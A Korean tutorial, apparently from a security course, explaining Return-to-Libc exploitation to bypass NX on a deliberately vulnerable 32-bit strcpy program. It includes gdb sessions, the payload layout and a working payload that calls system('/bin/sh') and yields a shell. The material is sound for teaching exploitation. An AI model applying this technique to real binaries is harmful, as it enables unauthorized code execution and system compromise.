Return To Libc(RTL) :
    Return To Libc(RTL)은 리턴 주소를 라이브러리 내에 존재하는 함수의 주소로 바꿔 NX bit를 우회하는 공격 기법입니다.

    리눅스 익스플로잇의 최종 목표는 셸 바이너리를 실행하는 것입니다.
    libc.so.6 라이브러리에는 execve , execlp , execl , execvp , system , popen 등 프로그램을 실행할 수 있는 다양한 함수들이 존재합니다.
    이 중 system 함수는 인자를 하나만 받기 때문에 익스플로잇할 때 많이 사용됩니다.
    system 함수의 인자는 실행할 셸 명령어 문자열의 주소이기 때문에, 
    만약 "/bin/sh" 문자열의 주소를 system 함수의 인자로 넘겨준 후 호출하면 /bin/sh 바이너리가 실행됩니다.

    example1 예제에 NX bit가 추가된 example1_nx를 이용해 RTL을 실습해 보도록 하겠습니다.
    ex)
        //gcc -o example1_nx example1.c -fno-stack-protector -mpreferred-stack-boundary=2 -m32
        #include <stdio.h>
        int vuln(char * src){
        
            char buf[32] = {};
            
            strcpy(buf, src);
            return 0;
        }
        int main(int argc, char * argv[], char * environ[]){
            if (argc < 2){
                exit(-1);
            }
            vuln(argv[1]);
            return 0;
        }

    취약점은 이전과 동일하지만 example1_nx에는 NX bit가 적용되어 스택의 셸코드를 실행시킬 수 없습니다.

    이전 익스플로잇에서는 스택 내의 셸코드를 실행시켜 execve 시스템 콜을 호출하는 것이 목표였다면, 
    RTL의 목표는 라이브러리 내에 존재하는 system 함수를 호출하여 system("/bin/sh")를 실행하는 것입니다.
    
    ex)
        (gdb) r `python -c 'print "A"*36+"BBBB"'`
        Starting program: ~/example1_nx `python -c 'print "A"*36+"BBBB"'`
        
        Program received signal SIGSEGV, Segmentation fault.
        0x42424242 in ?? ()
        (gdb) info reg
        eax            0x0	0
        ecx            0xffffd770	-10384
        edx            0xffffd520	-10976
        ebx            0x0	0
        esp            0xffffd524	0xffffd524
        ebp            0x41414141	0x41414141
        esi            0xf7fb5000	-134524928
        edi            0xf7fb5000	-134524928
        eip            0x42424242	0x42424242
        eflags         0x10286	[ PF SF IF RF ]
        cs             0x23	35
        ss             0x2b	43
        ds             0x2b	43
        es             0x2b	43
        fs             0x0	0
        gs             0x63	99
        
        (gdb) x/4wx $esp-4
        0xffffd520:	0x42424242	0xffffd700	0x00000000	0xf7e1b637
        (gdb) 

    buf 배열부터 vuln 함수의 리턴 주소 위치까지는 이전과 동일하게 36바이트 입니다.
    실행 결과 eip 레지스터가 0x42424242로 바뀌었고, 
    ret을 하기 전의 스택 포인터인 esp-4 메모리에 0x42424242가 저장되어있는 것을 볼 수 있습니다.

    만약 인자가 3개인 함수 func(1, 2, 3)을 호출한다면, func+0 시점에서의 스택 메모리 상태는 다음과 같습니다.

    RTL에서, 리턴 주소에 호출할 함수의 주소를 덮어쓴 후 ret을 하면 eip 레지스터가 덮은 값이 되고, esp 레지스터는 리턴 주소의 위치+4가 됩니다.

    위 스택 구조를 참고해 보았을 때, 함수 시작 부분에서의 인자의 위치는 esp+4가 되고,
    호출된 함수의 리턴 주소가 저장된 위치는 esp+0이 됩니다.

    앞서 배운 함수 호출 규약을 참고하여 보면, system("/bin/sh")를 호출하는 익스플로잇 코드는 오른쪽의 익스플로잇 코드 구조와 같이 구성됩니다.

    BBBB 문자열은 system 함수가 종료되고 난 후 리턴할 주소인데,
    단지 system("/bin/sh")를 실행하는 것이 목표이기 때문에 임의의 값을 적어도 무방합니다.

    익스플로잇 코드 구조 :
        ex)
            "A" * 36 + (system 함수 주소) + "BBBB" + ("/bin/sh" 주소)

    
    이제 앞에서 알아낸 system 함수와 "/bin/sh" 문자열의 주소를 이용해 실제 익스플로잇을 만들어 보면 오른쪽의 익스플로잇 코드가 완성됩니다.
    ex) 익스플로잇 코드
        "A"*36 + "\xa0\xdd\xe3\xf7" + "BBBB" + "\x0b\xea\xf5\xf7"

    ex) 익스플로잇 코드 실행
        $ ./example1_nx `python -c 'print "A"*36 + "\xa0\xdd\xe3\xf7" + "BBBB" + "\x0b\xea\xf5\xf7"'`
        $ id
        uid=1001(theori) gid=1001(theori) groups=1001(theori)
        $

    vuln 함수가 리턴하는 시점에 브레이크포인트를 설정해 스택 메모리를 살펴보겠습니다.
    ex)
        (gdb) disas vuln
        Dump of assembler code for function vuln:
            0x0804843b <+0>:	push   ebp
            0x0804843c <+1>:	mov    ebp,esp
            0x0804843e <+3>:	sub    esp,0x20
            ...
            0x08048475 <+58>:	ret    
        End of assembler dump.
        (gdb) b *0x08048475
        Breakpoint 1 at 0x8048475
        (gdb) r `python -c 'print "A"*36+"\xa0\xdd\xe3\xf7"+"BBBB"+"\x0b\xea\xf5\xf7"'`
        Starting program: ~/example1_nx `python -c 'print "A"*36+"\xa0\xdd\xe3\xf7"+"BBBB"+"\x0b\xea\xf5\xf7"'`
        
        Breakpoint 1, 0x08048475 in vuln ()
        (gdb) x/i $eip
        => 0x8048475 <vuln+58>:	ret    
        (gdb) x/3wx $esp
        0xffffd5b0:	0xf7e3dda0	0x42424242	0xf7f5ea0b

    system 함수의 주소와 "/bin/sh" 문자열의 주소가 스택에 저장되어 있는 것을 확인할 수 있습니다.

    마지막으로 이를 실제 바이너리의 argv[1]에 넣어 실행해보면 정상적으로 셸이 실행되는 것을 확인할 수 있습니다.
    



























